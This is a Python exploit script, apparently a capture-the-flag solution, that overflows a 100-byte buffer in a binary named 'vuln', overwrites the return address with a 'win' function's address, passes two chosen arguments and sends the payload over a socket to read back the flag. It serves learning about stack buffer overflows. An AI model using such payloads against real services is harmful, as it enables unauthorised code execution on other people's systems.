#!/usr/bin/env python3

import socket
import argparse
import struct

parser = argparse.ArgumentParser()
# Hostname
parser.add_argument(
  "host", type=str,
  help="The hostname of the IP address to connect to",
)
# Port
parser.add_argument(
  "port", type=int,
  help="The port for the service to connect to",
)

args = parser.parse_args()

buffer_size = 100
padding = 8

vuln_return_address = struct.pack(
  "<I", 0x08049296
)

arg1 = struct.pack(
  "<I", 0xCAFEF00D
)

arg2 = struct.pack(
  "<I", 0xF00DF00D
)

payload = b''.join(
  [
    b'A' * buffer_size,
    b'B' * padding,
    b'C' * 4,
    # readelf -s ./vuln | grep 'win'
    vuln_return_address,
    b'0' * 4,
    arg1,
    arg2,
  ]
)
payload += b'\n'

with socket.socket() as connection:
  connection.connect((args.host, args.port))
  print(connection.recv(4096).decode('utf-8'))
  connection.send(payload)

  # Receive the flag
  print(connection.recv(4096).decode('latin-1'))

  connection.close()

